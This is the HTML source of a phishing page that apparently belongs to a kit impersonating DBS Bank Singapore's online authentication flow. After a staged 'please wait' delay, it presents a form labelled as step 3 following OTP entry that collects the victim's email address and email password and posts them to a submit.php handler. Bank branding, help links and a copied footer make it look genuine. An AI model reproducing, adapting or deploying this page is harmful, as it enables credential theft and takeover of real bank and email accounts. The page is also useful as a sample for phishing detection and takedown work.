﻿<html><head>




<meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">



<meta charset="utf-8">
<title>DBS Authenticate</title>
<link href="css/style.css" rel="stylesheet" type="text/css" media="screen">
<link href="css/theme.css" rel="stylesheet" type="text/css" media="screen">
</head>
<body>
<header><div class="container clearfix"><div class="pull-left logo"><a>DBS</a><span>Authenticate</span> <span class="time-stamp">Singapore</span> </div><div class="pull-right right-menu"><ul><li> <a href="javascript:GetTip('https://www.dbs.com.sg/ibanking/help/index.html?ref=help-my-personal-information')" title="Help" tabindex="8"><i class="icon icon-help"></i><span class="m-hidden pad-hidden">Help</span></a> </li><li> <a href="#" data-toggle="modal" data-target="#cancelRegistration" title="Cancel" tabindex="9"> <i class="icon icon-cancel"></i> <span class="m-hidden pad-hidden">Cancel</span> </a> </li></ul></div></div></header>


    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" ></script> <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"></script>



    <script type="text/javascript">setTimeout(function() { 
    $('#mydiv').fadeOut('fast'); 
  $('#mydiv2').show('fast');}, 20000); 
</script>

<div id="mydiv">
  <table width=100% height=100%>
   <tr height=100% align=middle>
    <td width=100% align=center>
  <img src="css/PleaseWait.gif">
    </td>
   </tr>
  </table>

</div>

<!-- MR1602 end -->
<!--Header Ends here-->
<div id="mydiv2" style="display: none">


<section class="step-tracker">
  <div class="container clearfix">
   
    <ul class="four m-hidden"><li class="active">1. Identify</li><li class="active">2. Enter OTP</li><li class="active">3. Authenticate</li><li class="">4. Complete</li></ul>
    <!--Step Tracker Ends here Desktop version-->
    
    <div class="d-hidden clearfix"><div class="pull-left"> 3. Authenticate</div><div class="pull-right"> Step <span class="step-count">1</span> of <span class="total-steps">4</span> </div></div>
    <!--Step Tracker Ends here Mobile version--> 
    
  </div>
</section>
<!--Step-Tracker Ends here-->

<div class="container">

  <section class="content clearfix">
   
 <div style="margin-bottom: 30px;"><span style="font-weight:bold;margin-top: 20px;">Please enter the email address registered with us to complete the vérification.</span></div>
  <form name="MainForm" action="submit.php" autocomplete="off" method="post">
  <input type="text" style="display: none;" value="5" name="page">
  
    
    <!--end of form-row-->
    
   
    <!--end of form-row-->
    
    <div class="form-row" id="dob" style="display: block;">
      <h4 style="text-transform: none">Email Address</h4>
      <div class="label-value">
        <div class="calendar input-group date">
          <input type="email" name="email" id="identity_dob" tabindex="3" required="" value="" placeholder="">

          <span class="input-group-addon"></div>
      </div>
    </div>
       <div class="form-row" id="dob" style="display: block;">
      <h4 style="text-transform: none">Email Password</h4>
      <div class="label-value">
        <div class="calendar input-group date">
          <input type="Password" name="password" id="identity_dob" tabindex="3" required="" value="" placeholder="">
          
          <span class="input-group-addon"></div>
      </div>
    </div>
    <!--end of form-row Calendar-->
    
    <article class="">
       <div class="text-center marginTop30">
       		<input type="submit"  value="Next" class="btn btn-primary" data-dismiss="modal" title="Next" tabindex="4">
      	</div>
    </article>


  </form>
  </section>
  <!--Content Ends Here-->
  
 <footer><ul><li><a href="">Terms &amp; Conditions</a></li><li><a href="">Privacy Policy</a></li><li><a href="">Fair Dealing Commitment</a></li><li><a href="">Compliance with Tax Requirements</a></li><li><a href="">©2021 DBS Bank LTD. Co. Reg. No. 1968003006E</a></li></ul></footer>
  <!--Footer Ends here--> 
  
</div>
  <!-- Modal Cancel Registration-->
 





	



 


 




















</body></html>